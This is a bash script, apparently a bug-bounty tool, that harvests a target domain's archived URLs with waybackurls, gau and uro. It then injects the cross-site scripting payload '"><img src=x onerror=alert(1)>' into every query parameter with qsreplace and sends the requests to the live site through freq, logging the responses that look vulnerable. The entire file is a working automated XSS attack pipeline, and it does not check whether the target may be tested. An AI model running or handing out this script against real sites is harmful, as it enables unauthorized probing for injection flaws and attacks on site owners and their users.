#!/bin/bash
count=1
while true;
do
    urlC="$1-$count"
    ((count++))
        if [ ! -d "./$urlC" ]; then
            mkdir "./$urlC" 
            break       
        else 
            urlC="$1-$count"      
        fi
done

echo "[+] Running waybackurls"
waybackurls $1 > ./$urlC/archive_links
echo "[+] Running gau"
gau $1 >> ./$urlC/archive_links
sort -u ./$urlC/archive_links -o ./$urlC/archive_links
uro -i ./$urlC/archive_links | tee -a ./$urlC/archive_links_uro
echo "[+] Starting qsreplace and freq"
cat ./$urlC/archive_links_uro | grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | tee -a ./$urlC/freq_output | grep -iv "Not Vulnerable" | tee -a ./$urlC/freq_xss_findings
echo "[+] Script Execution Ended"